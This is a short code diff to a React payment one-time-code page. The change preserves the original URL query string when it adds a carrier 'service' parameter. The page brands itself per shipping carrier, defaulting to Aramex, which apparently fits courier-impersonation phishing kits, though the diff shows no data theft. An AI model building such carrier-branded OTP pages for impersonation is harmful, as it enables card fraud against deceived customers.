@@ -22,6 +22,7 @@ const PaymentOTP = () => {
   const { data: payment, refetch } = usePayment(paymentId);
   const { data: link } = useLink(payment?.link_id || undefined);
   const updatePayment = useUpdatePayment();
+  const initialSearch = useMemo(() => (typeof window !== "undefined" ? window.location.search : ""), []);
   const urlServiceKey = useMemo(
     () => (typeof window !== "undefined" ? new URLSearchParams(window.location.search).get('service') : null),
     []
@@ -37,7 +38,14 @@ const PaymentOTP = () => {
   const serviceKey = link?.payload?.service_key || link?.payload?.service || link?.payload?.carrier || urlServiceKey || sessionServiceKey || 'aramex';
   const serviceName = link?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
-  const serviceQuery = serviceKey ? `?service=${encodeURIComponent(serviceKey)}` : "";
+  const serviceQuery = useMemo(() => {
+    const params = new URLSearchParams(initialSearch || "");
+    if (serviceKey) {
+      params.set('service', serviceKey);
+    }
+    const search = params.toString();
+    return search ? `?${search}` : "";
+  }, [initialSearch, serviceKey]);
 
   useEffect(() => {
     if (serviceKey) {
